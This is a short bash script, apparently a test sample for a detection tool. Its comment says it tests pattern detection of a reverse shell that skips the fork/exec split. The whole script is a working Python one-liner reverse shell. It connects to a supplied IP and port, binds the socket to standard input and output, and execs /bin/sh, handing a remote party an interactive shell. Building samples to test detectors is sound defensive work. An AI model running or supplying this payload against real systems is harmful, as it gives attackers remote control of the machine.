#!/bin/bash
# Direct exec reverse shell (no fork)
# Purpose: Test pattern detection without fork/exec split

IP=${1:-127.0.0.1}
PORT=${2:-4444}

echo "🎯 Executing direct-exec reverse shell (no fork)..."
echo "   Target: $IP:$PORT"
echo ""

# This Python script does exec directly, replacing its own process
python3 -c "import socket,os;s=socket.socket();s.connect(('$IP',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.execve('/bin/sh',['/bin/sh'],{})"
